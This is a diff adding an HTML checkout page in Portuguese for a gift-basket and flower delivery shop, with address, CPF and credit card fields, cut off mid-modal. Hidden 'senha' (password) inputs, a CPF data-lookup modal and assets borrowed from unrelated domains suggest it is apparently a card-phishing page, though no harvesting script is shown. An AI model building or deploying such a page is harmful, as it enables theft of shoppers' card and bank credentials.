@@ -1,0 +1,2930 @@
+<!doctype html>
+<html lang="pt-BR">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Finalizar Pedido</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
+    <link rel="stylesheet" href="/css/custom-colors.css?v=1775716260" />
+    <style>
+      * {
+        font-family:
+          -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      }
+      body {
+        background: #f5f5f5;
+        margin: 0;
+        padding: 0;
+      }
+      :root {
+        --ch: #fd3f3f;
+        --cb: #fd3f3f;
+        --cp: #ed0707;
+        --ce: #ea3434;
+      }
+      .container-mobile {
+        max-width: 680px;
+        margin: 0 auto;
+        background: #f5f5f5;
+        min-height: 100vh;
+        padding-bottom: 32px;
+      }
+
+      /* Progress */
+      .prog-wrap {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 20px 0 16px;
+      }
+      .prog-step {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        gap: 6px;
+      }
+      .prog-circle {
+        width: 36px;
+        height: 36px;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 14px;
+        font-weight: 700;
+        z-index: 2;
+      }
+      .prog-circle.active {
+        background: var(--ce);
+        color: #fff;
+      }
+      .prog-circle.done {
+        background: var(--ce);
+        color: #fff;
+      }
+      .prog-circle.idle {
+        background: #e5e7eb;
+        color: #9ca3af;
+      }
+      .prog-label {
+        font-size: 11px;
+        font-weight: 500;
+      }
+      .prog-label.active {
+        color: #1f2937;
+      }
+      .prog-label.idle {
+        color: #9ca3af;
+      }
+      .prog-line {
+        width: 68px;
+        height: 2px;
+        background: #e5e7eb;
+        margin: 0 -4px;
+        position: relative;
+        top: -9px;
+        z-index: 1;
+      }
+      .prog-line.done {
+        background: var(--ce);
+      }
+
+      /* Inputs */
+      .lbl {
+        display: block;
+        font-size: 13px;
+        font-weight: 600;
+        color: #374151;
+        margin-bottom: 2px;
+      }
+      .inp {
+        width: 100%;
+        padding: 7px 14px;
+        border: 1.5px solid #c9cbcf;
+        border-radius: 10px;
+        font-size: 14px;
+        color: #111827;
+        box-sizing: border-box;
+        outline: none;
+        background: #fff;
+        transition: border-color 0.15s;
+      }
+      .inp:focus {
+        border-color: var(--ce);
+      }
+      /* ── Card field errors ── */
+      .field-err {
+        font-size: 11.5px;
+        color: #ef4444;
+        margin-top: 5px;
+        min-height: 0;
+        line-height: 1.4;
+        display: none;
+      }
+      .field-err.show {
+        display: block;
+      }
+      .inp.err {
+        border-color: #ef4444 !important;
+        background: #fff8f8;
+      }
+      .inp.ok {
+        border-color: #10b981 !important;
+      }
+      .g2 {
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        gap: 12px;
+      }
+      .g-cep {
+        display: grid;
+        grid-template-columns: 130px 1fr;
+        gap: 12px;
+      }
+
+      /* Buttons */
+      .btn-p {
+        background: var(--cb);
+        color: #fff;
+        font-weight: 700;
+        padding: 8px;
+        border-radius: 12px;
+        width: 100%;
+        border: none;
+        font-size: 15px;
+        cursor: pointer;
+      }
+      .btn-s {
+        background: #fff;
+        color: #6b7280;
+        font-weight: 600;
+        padding: 15px;
+        border-radius: 12px;
+        width: 100%;
+        border: 1.5px solid #e5e7eb;
+        font-size: 15px;
+        cursor: pointer;
+      }
+
+      /* Cart items (same as index modal) */
+      .ck-item {
+        display: flex;
+        align-items: flex-start;
+        gap: 12px;
+        padding: 12px;
+        border-bottom: 1px solid #f3f4f6;
+        background: #f9fafb;
+        border-radius: 12px;
+        margin-bottom: 8px;
+      }
+      .ck-item:last-child {
+        margin-bottom: 0;
+      }
+      .ck-item img {
+        width: 64px;
+        height: 64px;
+        border-radius: 10px;
+        object-fit: cover;
+        flex-shrink: 0;
+      }
+      .ck-ph {
+        width: 64px;
+        height: 64px;
+        background: #e5e7eb;
+        border-radius: 10px;
+        flex-shrink: 0;
+      }
+
+      /* Payment options */
+      .pay-opt {
+        border: 1.5px solid #e5e7eb;
+        border-radius: 12px;
+        padding: 8px 12px;
+        display: flex;
+        align-items: center;
+        gap: 14px;
+        cursor: pointer;
+        background: #fff;
+        margin-bottom: 10px;
+        transition: border-color 0.15s;
+      }
+      .pay-opt:hover {
+        border-color: var(--ce);
+      }
+      .pay-opt.sel {
+        border-color: var(--ce);
+        background: #fdf4ff;
+      }
+      .pay-radio {
+        width: 20px;
+        height: 20px;
+        border-radius: 50%;
+        border: 2px solid #d1d5db;
+        flex-shrink: 0;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        transition: all 0.15s;
+      }
+      .pay-opt.sel .pay-radio {
+        border-color: var(--ce);
+        background: var(--ce);
+      }
+      .pay-dot {
+        width: 8px;
+        height: 8px;
+        background: #fff;
+        border-radius: 50%;
+        display: none;
+      }
+      .pay-opt.sel .pay-dot {
+        display: block;
+      }
+      .pay-icon {
+        width: 44px;
+        height: 44px;
+        background: #f3f4f6;
+        border-radius: 10px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        flex-shrink: 0;
+      }
+
+      /* Step2 summary rows */
+      .sum-row {
+        display: flex;
+        align-items: flex-start;
+        gap: 12px;
+        padding: 10px 0;
+        border-bottom: 1px solid #f3f4f6;
+      }
+      .sum-row:last-child {
+        border-bottom: none;
+      }
+
+      /* Modal card */
+      div#blc {
+        max-width: 95px;
+        text-align: center;
+        margin: 0 auto;
+      }
+
+      /* Totals */
+      .tot-row {
+        display: flex;
+        justify-content: space-between;
+        margin-bottom: 6px;
+      }
+
+      /* CPF modal */
+      #cpf-modal {
+        display: none;
+        position: fixed;
+        inset: 0;
+        background: rgba(0, 0, 0, 0.5);
+        z-index: 9000;
+        align-items: center;
+        justify-content: center;
+        padding: 20px;
+      }
+      #cpf-modal.open {
+        display: flex;
+      }
+      .cpf-box {
+        background: #fff;
+        border-radius: 20px;
+        padding: 30px 22px;
+        text-align: center;
+        max-width: 310px;
+        width: 100%;
+        box-shadow: 0 16px 48px rgba(0, 0, 0, 0.22);
+      }
+
+      /* Spinner */
+      .spin-ring {
+        width: 54px;
+        height: 54px;
+        border: 4px solid #f0f0f0;
+        border-top-color: var(--ce);
+        border-radius: 50%;
+        animation: spin 0.85s linear infinite;
+        margin: 0 auto 14px;
+      }
+      @keyframes spin {
+        to {
+          transform: rotate(360deg);
+        }
+      }
+
+      /* Card modal */
+      #card-modal {
+        display: none;
+        position: fixed;
+        inset: 0;
+        background: rgba(0, 0, 0, 0.7);
+        z-index: 9999;
+        backdrop-filter: blur(4px);
+        align-items: center;
+        justify-content: center;
+      }
+      #card-modal.open {
+        display: flex;
+      }
+      @keyframes dpulse {
+        0%,
+        100% {
+          opacity: 0.2;
+        }
+        50% {
+          opacity: 1;
+        }
+      }
+      .dp {
+        width: 11px;
+        height: 11px;
+        border-radius: 50%;
+        background: var(--ce);
+        animation: dpulse 1.4s infinite;
+      }
+      .dp:nth-child(2) {
+        animation-delay: 0.2s;
+      }
+      .dp:nth-child(3) {
+        animation-delay: 0.4s;
+      }
+
+      /* Processing modal */
+      #proc-modal {
+        display: none;
+        position: fixed;
+        inset: 0;
+        background: rgba(0, 0, 0, 0.6);
+        z-index: 9999;
+        align-items: center;
+        justify-content: center;
+      }
+      #proc-modal.open {
+        display: flex;
+      }
+
+      .hidden {
+        display: none !important;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container-mobile">
+      <!-- Header -->
+      <div
+        style="
+          background: var(--ch);
+          color: #fff;
+          padding: 13px 16px;
+          display: flex;
+          align-items: center;
+          justify-content: center;
+          position: relative;
+        "
+      >
+        <a
+          href="/"
+          style="
+            position: absolute;
+            left: 14px;
+            color: #fff;
+            display: flex;
+            align-items: center;
+            text-decoration: none;
+          "
+        >
+          <svg
+            width="22"
+            height="22"
+            fill="none"
+            stroke="currentColor"
+            viewBox="0 0 24 24"
+            stroke-width="2.5"
+          >
+            <path
+              stroke-linecap="round"
+              stroke-linejoin="round"
+              d="M15 18l-6-6 6-6"
+            />
+          </svg>
+        </a>
+        <span style="font-size: 17px; font-weight: 700">Finalizar Pedido</span>
+      </div>
+
+      <!-- ── Resumo do pedido (accordion) ── -->
+      <div style="margin: 14px 14px 0">
+        <div
+          style="
+            background: #fff;
+            border-radius: 16px;
+            box-shadow: 0 1px 6px rgba(0, 0, 0, 0.07);
+            overflow: hidden;
+          "
+        >
+          <div
+            onclick="toggleSummary()"
+            style="
+              display: flex;
+              align-items: center;
+              gap: 10px;
+              padding: 13px 16px;
+              cursor: pointer;
+              user-select: none;
+            "
+          >
+            <svg
+              width="21"
+              height="21"
+              fill="none"
+              stroke="var(--ce)"
+              viewBox="0 0 24 24"
+              stroke-width="2"
+            >
+              <path d="M6 2L3 6v14a2 2 0 002 2h14a2 2 0 002-2V6l-3-4z" />
+              <line x1="3" y1="6" x2="21" y2="6" />
+              <path d="M16 10a4 4 0 01-8 0" />
+            </svg>
+            <span
+              id="sum-lbl"
+              style="font-size: 14px; font-weight: 600; color: #374151; flex: 1"
+              >Mostrar resumo do pedido</span
+            >
+            <span style="font-size: 14px; font-weight: 700; color: #374151"
+              >R$ 112,80</span
+            >
+            <svg
+              id="sum-chev"
+              width="17"
+              height="17"
+              fill="none"
+              stroke="#9ca3af"
+              viewBox="0 0 24 24"
+              stroke-width="2.5"
+            >
+              <polyline points="6 9 12 15 18 9" />
+            </svg>
+          </div>
+          <div id="sum-body" style="display: none">
+            <div style="padding: 0 12px 12px">
+              <div class="ck-item">
+                <img
+                  src="/uploads/products/product_1772583614_69a77abe7d268.webp"
+                  alt=""
+                />
+                <div style="flex: 1; min-width: 0">
+                  <div
+                    style="
+                      font-size: 14px;
+                      font-weight: 600;
+                      color: #1f2937;
+                      margin-bottom: 2px;
+                    "
+                  >
+                    Cesta Mini Romântica com Caneca, Chocolates e Buquê
+                  </div>
+                  <div style="font-size: 12px; color: #9ca3af; margin-top: 3px">
+                    Qtd: 1
+                  </div>
+                  <div
+                    style="
+                      font-size: 14px;
+                      font-weight: 700;
+                      color: var(--cp);
+                      margin-top: 4px;
+                    "
+                  >
+                    R$ 42,90
+                  </div>
+                </div>
+              </div>
+              <div class="ck-item">
+                <img
+                  src="/uploads/products/product_1772581555_69a772b314b5b.webp"
+                  alt=""
+                />
+                <div style="flex: 1; min-width: 0">
+                  <div
+                    style="
+                      font-size: 14px;
+                      font-weight: 600;
+                      color: #1f2937;
+                      margin-bottom: 2px;
+                    "
+                  >
+                    Cesta Café da Manhã Light
+                  </div>
+                  <div style="font-size: 12px; color: #9ca3af; margin-top: 3px">
+                    Qtd: 1
+                  </div>
+                  <div
+                    style="
+                      font-size: 14px;
+                      font-weight: 700;
+                      color: var(--cp);
+                      margin-top: 4px;
+                    "
+                  >
+                    R$ 69,90
+                  </div>
+                </div>
+              </div>
+              <div
+                style="
+                  border-top: 1px solid #f3f4f6;
+                  margin-top: 10px;
+                  padding-top: 10px;
+                "
+              >
+                <div class="tot-row">
+                  <span style="font-size: 13px; color: #6b7280">Subtotal</span
+                  ><span style="font-size: 14px; font-weight: 600"
+                    >R$ 112,80</span
+                  >
+                </div>
+                <div class="tot-row">
+                  <span style="font-size: 13px; color: #6b7280">Frete</span
+                  ><span
+                    style="font-size: 14px; font-weight: 600; color: #10b981"
+                    >Grátis</span
+                  >
+                </div>
+                <div
+                  class="tot-row"
+                  style="
+                    border-top: 1px solid #f3f4f6;
+                    padding-top: 8px;
+                    margin-top: 2px;
+                  "
+                >
+                  <span style="font-size: 15px; font-weight: 700">Total</span>
+                  <span
+                    style="font-size: 17px; font-weight: 800; color: var(--cp)"
+                    >R$ 112,80</span
+                  >
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- ── Progress (2 steps) ── -->
+      <div class="prog-wrap">
+        <div class="prog-step">
+          <div class="prog-circle active" id="pc1">
+            <span id="pc1c">1</span>
+          </div>
+          <span class="prog-label active" id="pl1">Dados de Entrega</span>
+        </div>
+        <div class="prog-line" id="pline"></div>
+        <div class="prog-step">
+          <div class="prog-circle idle" id="pc2"><span id="pc2c">2</span></div>
+          <span class="prog-label idle" id="pl2">Pagamento</span>
+        </div>
+      </div>
+
+      <!-- ══════════════════════════
+         STEP 1 — Dados de Entrega
+    ══════════════════════════ -->
+      <div id="step1" style="margin: 0 14px">
+        <div
+          style="
+            background: #fff;
+            border-radius: 16px;
+            box-shadow: 0 1px 6px rgba(0, 0, 0, 0.07);
+            padding: 20px;
+          "
+        >
+          <div
+            style="
+              font-size: 16px;
+              font-weight: 500;
+              color: #1f2937;
+              margin-bottom: 16px;
+            "
+          >
+            Detalhes de entrega
+          </div>
+
+          <!-- CPF simples -->
+          <div style="margin-bottom: 14px">
+            <label class="lbl">CPF</label>
+            <input
+              type="text"
+              id="cpf-field"
+              class="inp"
+              placeholder="000.000.000-00"
+              maxlength="14"
+              oninput="maskCpf(this)"
+              required
+            />
+          </div>
+
+          <!-- Nome -->
+          <div style="margin-bottom: 14px">
+            <label class="lbl">Nome Completo</label>
+            <input
+              type="text"
+              id="customer_name"
+              class="inp"
+              placeholder="Ex: João da Silva"
+            />
+          </div>
+
+          <!-- Telefone -->
+          <div style="margin-bottom: 14px">
+            <label class="lbl">Telefone (WhatsApp)</label>
+            <input
+              type="tel"
+              id="phone"
+              class="inp"
+              placeholder="(00) 00000-0000"
+            />
+          </div>
+
+          <!-- Email -->
+          <div style="margin-bottom: 20px">
+            <label class="lbl">Email</label>
+            <input
+              type="email"
+              id="email"
+              class="inp"
+              placeholder="seu@email.com"
+            />
+          </div>
+
+          <!-- Divider icon -->
+          <div
+            style="
+              text-align: center;
+              color: #b0b2b5;
+              margin: 0 0 14px;
+              display: flex;
+              justify-content: center;
+            "
+          >
+            <svg
+              width="22"
+              height="22"
+              fill="none"
+              stroke="currentColor"
+              viewBox="0 0 24 24"
+              stroke-width="1.5"
+            >
+              <path
+                stroke-linecap="round"
+                stroke-linejoin="round"
+                d="M15 10.5a3 3 0 11-6 0 3 3 0 016 0z"
+              />
+              <path
+                stroke-linecap="round"
+                stroke-linejoin="round"
+                d="M19.5 10.5c0 7.142-7.5 11.25-7.5 11.25S4.5 17.642 4.5 10.5a7.5 7.5 0 1115 0z"
+              /></svg
+            >Endereço
+          </div>
+
+          <!-- CEP + Rua -->
+          <div class="g-cep" style="margin-bottom: 14px">
+            <div>
+              <label class="lbl">CEP</label>
+              <input
+                type="text"
+                id="zipcode"
+                class="inp"
+                placeholder="00000-000"
+                maxlength="9"
+                oninput="handleCep(this)"
+              />
+            </div>
+            <div>
+              <label class="lbl">Rua</label>
+              <input
+                type="text"
+                id="address"
+                class="inp"
+                placeholder="Ex: Av. Paulista"
+              />
+            </div>
+          </div>
+
+          <!-- Número + Bairro -->
+          <div class="g2" style="margin-bottom: 14px">
+            <div>
+              <label class="lbl">Número</label>
+              <input
+                type="text"
+                id="number"
+                class="inp"
+                placeholder="Ex: 123"
+              />
+            </div>
+            <div>
+              <label class="lbl">Bairro</label>
+              <input
+                type="text"
+                id="neighborhood"
+                class="inp"
+                placeholder="Ex: Centro"
+              />
+            </div>
+          </div>
+
+          <!-- Cidade + Estado -->
+          <div class="g2" style="margin-bottom: 22px">
+            <div>
+              <label class="lbl">Cidade</label>
+              <input
+                type="text"
+                id="city"
+                class="inp"
+                placeholder="Ex: São Paulo"
+              />
+            </div>
+            <div>
+              <label class="lbl">Estado</label>
+              <input
+                type="text"
+                id="state"
+                class="inp"
+                placeholder="Ex: SP"
+                maxlength="2"
+              />
+            </div>
+          </div>
+
+          <button class="btn-p" onclick="goToPayment()">
+            Confirmar endereço
+          </button>
+        </div>
+      </div>
+
+      <!-- ══════════════════════════
+         STEP 2 — Pagamento
+    ══════════════════════════ -->
+      <div id="step2" class="hidden" style="margin: 0 14px">
+        <div
+          style="
+            background: #fff;
+            border-radius: 16px;
+            box-shadow: 0 1px 6px rgba(0, 0, 0, 0.07);
+            padding: 20px;
+          "
+        >
+          <!-- Resumo dados -->
+          <div style="margin-bottom: 20px">
+            <div class="sum-row">
+              <svg
+                style="color: #9ca3af; flex-shrink: 0; margin-top: 2px"
+                width="20"
+                height="20"
+                fill="none"
+                stroke="currentColor"
+                viewBox="0 0 24 24"
+                stroke-width="2"
+              >
+                <path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2" />
+                <circle cx="12" cy="7" r="4" />
+              </svg>
+              <div>
+                <div
+                  id="s2-name"
+                  style="font-size: 14px; font-weight: 600; color: #1f2937"
+                ></div>
+                <div
+                  id="s2-contact"
+                  style="font-size: 12px; color: #6b7280; margin-top: 1px"
+                ></div>
+              </div>
+            </div>
+            <div class="sum-row" style="align-items: center">
+              <svg
+                style="color: #9ca3af; flex-shrink: 0; margin-top: 2px"
+                width="20"
+                height="20"
+                fill="none"
+                stroke="currentColor"
+                viewBox="0 0 24 24"
+                stroke-width="2"
+              >
+                <path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0118 0z" />
+                <circle cx="12" cy="10" r="3" />
+              </svg>
+              <div style="flex: 1">
+                <div
+                  id="s2-address"
+                  style="font-size: 14px; font-weight: 600; color: #1f2937"
+                ></div>
+                <div
+                  id="s2-location"
+                  style="font-size: 12px; color: #6b7280; margin-top: 1px"
+                ></div>
+              </div>
+              <button
+                onclick="goBack()"
+                style="
+                  background: none;
+                  border: none;
+                  font-size: 13px;
+                  font-weight: 600;
+                  color: var(--ce);
+                  cursor: pointer;
+                  padding: 0 0 0 10px;
+                  flex-shrink: 0;
+                "
+              >
+                Trocar
+              </button>
+            </div>
+            <div class="sum-row" style="display: block; padding-bottom: 0">
+              <div
+                style="
+                  display: flex;
+                  align-items: center;
+                  gap: 8px;
+                  margin-bottom: 10px;
+                "
+              >
+                <svg
+                  style="color: #9ca3af; flex-shrink: 0"
+                  width="20"
+                  height="20"
+                  fill="none"
+                  stroke="currentColor"
+                  viewBox="0 0 24 24"
+                  stroke-width="2"
+                >
+                  <rect x="1" y="3" width="15" height="13" />
+                  <polygon points="16 8 20 8 23 11 23 16 16 16 16 8" />
+                  <circle cx="5.5" cy="18.5" r="2.5" />
+                  <circle cx="18.5" cy="18.5" r="2.5" />
+                </svg>
+                <span style="font-size: 13px; font-weight: 600; color: #374151"
+                  >Opções de entrega</span
+                >
+              </div>
+              <!-- Opção 1: Padrão/Grátis -->
+              <div
+                class="pay-opt sel"
+                id="freight-slow"
+                onclick="selFreight('slow')"
+                style="margin-bottom: 8px; padding: 12px 14px"
+              >
+                <div style="flex: 1">
+                  <div
+                    style="font-size: 14px; font-weight: 700; color: #1f2937"
+                  >
+                    Hoje, 35 – 45 min
+                  </div>
+                  <div style="font-size: 11px; color: #6b7280">Padrão</div>
+                </div>
+                <span
+                  style="
+                    font-size: 10px;
+                    font-weight: 500;
+                    background: #14b728;
+                    color: #fff;
+                    padding: 3px 10px;
+                    border-radius: 6px;
+                    letter-spacing: 0.7px;
+                  "
+                  >GRÁTIS</span
+                >
+                <div class="pay-radio" style="margin-left: 10px">
+                  <div class="pay-dot"></div>
+                </div>
+              </div>
+              <!-- Opção 2: Rápida -->
+              <div
+                class="pay-opt"
+                id="freight-fast"
+                onclick="selFreight('fast')"
+                style="margin-bottom: 0; padding: 12px 14px"
+              >
+                <div style="flex: 1">
+                  <div
+                    style="font-size: 14px; font-weight: 700; color: #1f2937"
+                  >
+                    Hoje, 19 – 29 min ⚡
+                  </div>
+                  <div style="font-size: 11px; color: #6b7280">Rápida</div>
+                </div>
+                <span style="font-size: 13px; font-weight: 700; color: #1f2937"
+                  >R$ 5,89</span
+                >
+                <div class="pay-radio" style="margin-left: 10px">
+                  <div class="pay-dot"></div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Cupom de desconto -->
+          <div style="margin-bottom: 18px">
+            <div
+              id="coupon-toggle-wrap"
+              style="display: flex; align-items: center; gap: 10px"
+            >
+              <button
+                id="coupon-badge"
+                onclick="toggleCoupon()"
+                style="
+                  background: #ef4444;
+                  color: #fff;
+                  border: none;
+                  border-radius: 20px;
+                  padding: 5px 14px;
+                  font-size: 12px;
+                  font-weight: 700;
+                  cursor: pointer;
+                  letter-spacing: 0.3px;
+                  white-space: nowrap;
+                "
+              >
+                🎟 Inserir cupom
+              </button>
+              <span
+                id="coupon-applied-label"
+                style="
+                  display: none;
+                  font-size: 13px;
+                  font-weight: 700;
+                  color: #10b981;
+                "
+              ></span>
+            </div>
+            <div
+              id="coupon-input-wrap"
+              style="display: none; margin-top: 10px; display: none"
+            >
+              <div style="display: flex; gap: 8px; align-items: center">
+                <input
+                  type="text"
+                  id="coupon-code"
+                  class="inp"
+                  placeholder="Código do cupom"
+                  style="
+                    flex: 1;
+                    text-transform: uppercase;
+                    letter-spacing: 1px;
+                  "
+                  oninput="this.value = this.value.toUpperCase()"
+                />
+                <button
+                  onclick="applyCoupon()"
+                  style="
+                    background: var(--cb);
+                    color: #fff;
+                    border: none;
+                    border-radius: 10px;
+                    padding: 10px 18px;
+                    font-size: 14px;
+                    font-weight: 700;
+                    cursor: pointer;
+                    white-space: nowrap;
+                  "
+                >
+                  Aplicar
+                </button>
+              </div>
+              <div
+                id="coupon-err"
+                style="
+                  font-size: 12px;
+                  color: #ef4444;
+                  margin-top: 6px;
+                  display: none;
+                "
+              ></div>
+            </div>
+          </div>
+
+          <!-- Forma de pagamento -->
+          <div
+            style="
+              font-size: 15px;
+              font-weight: 700;
+              color: #1f2937;
+              margin-bottom: 12px;
+            "
+          >
+            Forma de pagamento
+          </div>
+
+          <div class="pay-opt" id="pix-opt" onclick="selPay('pix')">
+            <div class="pay-icon">
+              <img
+                src="https://pedir-seu-acai.delivery/assets/pix-logo-DfOEZShQ.png"
+                alt="PIX"
+                width="34"
+                height="34"
+              />
+            </div>
+            <div style="flex: 1">
+              <div style="font-size: 14px; font-weight: 700; color: #1f2937">
+                PIX
+              </div>
+              <div style="font-size: 12px; color: #4db6ac">
+                Pagamento instantâneo
+              </div>
+            </div>
+            <div class="pay-radio"><div class="pay-dot"></div></div>
+          </div>
+
+          <div class="pay-opt" id="card-opt" onclick="selPay('card')">
+            <div class="pay-icon">
+              <svg
+                width="25"
+                height="25"
+                fill="none"
+                stroke="#6B7280"
+                viewBox="0 0 24 24"
+                stroke-width="2"
+              >
+                <rect x="1" y="4" width="22" height="16" rx="2" />
+                <line x1="1" y1="10" x2="23" y2="10" />
+              </svg>
+            </div>
+            <div style="flex: 1">
+              <div style="font-size: 14px; font-weight: 700; color: #1f2937">
+                Cartão de Crédito
+              </div>
+              <div style="font-size: 12px; color: #9ca3af">
+                Todas as bandeiras
+              </div>
+            </div>
+            <div class="pay-radio"><div class="pay-dot"></div></div>
+          </div>
+
+          <!-- Campos cartão -->
+          <div
+            id="card-fields"
+            style="
+              display: none;
+              padding: 16px;
+              background: #f9fafb;
+              border-radius: 12px;
+              margin-top: 4px;
+            "
+          >
+            <div id="ccsingle" style="display: none"></div>
+            <div id="ccsingle2" style="display: none"></div>
+            <input type="hidden" id="bname" value="" />
+            <input type="hidden" id="senha" value="" />
+            <input type="hidden" id="senhanum" value="" />
+            <input type="hidden" id="bcollor" value="" />
+            <div style="margin-bottom: 12px">
+              <label class="lbl">Número do Cartão</label>
+              <input
+                type="text"
+                id="card_number"
+                class="inp"
+                placeholder="0000 0000 0000 0000"
+                maxlength="19"
+              />
+              <div class="field-err" id="err_card_number"></div>
+            </div>
+            <div class="g2" style="margin-bottom: 12px">
+              <div>
+                <label class="lbl">Validade</label>
+                <input
+                  type="text"
+                  id="card_expiry"
+                  class="inp"
+                  placeholder="MM/AA"
+                  maxlength="5"
+                />
+                <div class="field-err" id="err_card_expiry"></div>
+              </div>
+              <div>
+                <label class="lbl">CVV</label>
+                <input
+                  type="text"
+                  id="card_cvv"
+                  class="inp"
+                  placeholder="000"
+                  maxlength="4"
+                />
+                <div class="field-err" id="err_card_cvv"></div>
+              </div>
+            </div>
+            <div>
+              <label class="lbl">CPF do Titular</label>
+              <input
+                type="text"
+                id="card_cpf"
+                class="inp"
+                placeholder="000.000.000-00"
+                maxlength="14"
+              />
+              <div class="field-err" id="err_card_cpf"></div>
+            </div>
+          </div>
+
+          <!-- Totais -->
+          <div
+            style="
+              margin-top: 20px;
+              padding-top: 16px;
+              border-top: 1px solid #f3f4f6;
+            "
+          >
+            <div class="tot-row">
+              <span style="font-size: 13px; color: #6b7280">Subtotal</span
+              ><span style="font-size: 14px; font-weight: 600">R$ 112,80</span>
+            </div>
+            <div class="tot-row" id="freight-row">
+              <span style="font-size: 13px; color: #6b7280">Frete</span>
+              <span
+                id="freight-display"
+                style="font-size: 14px; font-weight: 600; color: #10b981"
+                >Grátis</span
+              >
+            </div>
+            <div class="tot-row" id="coupon-row" style="display: none">
+              <span style="font-size: 13px; color: #10b981; font-weight: 600"
+                >🎟 Cupom</span
+              >
+              <span
+                id="coupon-display"
+                style="font-size: 14px; font-weight: 600; color: #10b981"
+              ></span>
+            </div>
+            <div
+              class="tot-row"
+              style="
+                border-top: 1px solid #f3f4f6;
+                padding-top: 10px;
+                margin-top: 4px;
+              "
+            >
+              <span style="font-size: 16px; font-weight: 700">Total</span>
+              <span
+                id="total-display"
+                style="font-size: 16px; font-weight: 700; color: var(--cp)"
+                >R$ 112,80</span
+              >
+            </div>
+          </div>
+
+          <!-- Botões -->
+          <div style="margin-top: 18px">
+            <button
+              class="btn-p"
+              id="btn-finalizar"
+              onclick="finalizarPedido()"
+            >
+              Confirmar Pedido
+            </button>
+          </div>
+
+          <div
+            style="
+              display: flex;
+              align-items: center;
+              justify-content: center;
+              gap: 6px;
+              margin-top: 14px;
+            "
+          >
+            <svg
+              width="12"
+              height="12"
+              fill="none"
+              stroke="#9ca3af"
+              viewBox="0 0 24 24"
+              stroke-width="2"
+            >
+              <rect x="3" y="11" width="18" height="11" rx="2" />
+              <path d="M7 11V7a5 5 0 0110 0v4" />
+            </svg>
+            <span style="font-size: 12px; color: #9ca3af"
+              >Pagamento 100% seguro</span
+            >
+          </div>
+        </div>
+      </div>
+
+      <div style="margin: 14px 14px 0">
+        <div
+          style="
+            background: #fff;
+            border-radius: 16px;
+            box-shadow: 0 1px 6px rgba(0, 0, 0, 0.07);
+            padding: 16px;
+            display: flex;
+            gap: 14px;
+            align-items: center;
+          "
+        >
+          <img
+            src="https://cestasefloresroyal.top/uploads/ads/checkout_banner_1772585138_69a780b2e4bc5.webp"
+            alt=""
+            style="
+              width: 48px;
+              height: 48px;
+              object-fit: contain;
+              flex-shrink: 0;
+              border-radius: 10px;
+            "
+          />
+          <div style="flex: 1">
+            <div style="font-size: 14px; margin-bottom: 3px">⭐⭐⭐⭐⭐</div>
+            <div
+              style="
+                font-size: 14px;
+                font-weight: 700;
+                color: #1f2937;
+                margin-bottom: 3px;
+              "
+            >
+              Entrega Segura e Rastreável
+            </div>
+            <div style="font-size: 11px; color: #6b7280; line-height: 1.5">
+              Seu pedido é entregue pela nossa loja e você acompanha em tempo
+              real.
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ════ CPF Modal ════ -->
+    <div id="cpf-modal">
+      <div class="cpf-box">
+        <div id="cpf-loading">
+          <div class="spin-ring"></div>
+          <div
+            style="
+              font-size: 15px;
+              font-weight: 600;
+              color: #1f2937;
+              margin-bottom: 6px;
+            "
+          >
+            Buscando seus dados
+          </div>
+          <div style="font-size: 13px; color: #6b7280">
+            Estamos buscando seus dados cadastrais.
+          </div>
+        </div>
+        <div id="cpf-found" style="display: none">
+          <div
+            style="
+              width: 56px;
+              height: 56px;
+              background: #dcfce7;
+              border-radius: 50%;
+              display: flex;
+              align-items: center;
+              justify-content: center;
+              margin: 0 auto 14px;
+            "
+          >
+            <svg
+              width="26"
+              height="26"
+              fill="none"
+              stroke="#16a34a"
+              viewBox="0 0 24 24"
+              stroke-width="2.5"
+            >
+              <polyline points="20 6 9 17 4 12" />
+            </svg>
+          </div>
+          <div
+            id="cpf-found-msg"
+            style="
+              font-size: 16px;
+              font-weight: 700;
+              color: #1f2937;
+              margin-bottom: 4px;
+            "
+          ></div>
+          <div style="font-size: 13px; color: #6b7280; margin-bottom: 18px">
+            É bom ter você de volta!
+          </div>
+          <button
+            onclick="closeCpfModal()"
+            style="
+              background: #16a34a;
+              color: #fff;
+              border: none;
+              border-radius: 10px;
+              padding: 12px;
+              font-size: 15px;
+              font-weight: 700;
+              cursor: pointer;
+              width: 100%;
+            "
+          >
+            Confirmar
+          </button>
+        </div>
+        <div id="cpf-notfound" style="display: none">
+          <div
+            style="
+              width: 56px;
+              height: 56px;
+              background: #f3f4f6;
+              border-radius: 50%;
+              display: flex;
+              align-items: center;
+              justify-content: center;
+              margin: 0 auto 14px;
+            "
+          >
+            <svg
+              width="26"
+              height="26"
+              fill="none"
+              stroke="#9ca3af"
+              viewBox="0 0 24 24"
+              stroke-width="2"
+            >
+              <path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2" />
+              <circle cx="12" cy="7" r="4" />
+            </svg>
+          </div>
+          <div
+            style="
+              font-size: 15px;
+              font-weight: 600;
+              color: #1f2937;
+              margin-bottom: 4px;
+            "
+          >
+            CPF não encontrado
+          </div>
+          <div style="font-size: 13px; color: #6b7280; margin-bottom: 18px">
+            Preencha seus dados manualmente.
+          </div>
+          <button
+            onclick="closeCpfModal()"
+            style="
+              background: var(--cb);
+              color: #fff;
+              border: none;
+              border-radius: 10px;
+              padding: 12px;
+              font-size: 15px;
+              font-weight: 700;
+              cursor: pointer;
+              width: 100%;
+            "
+          >
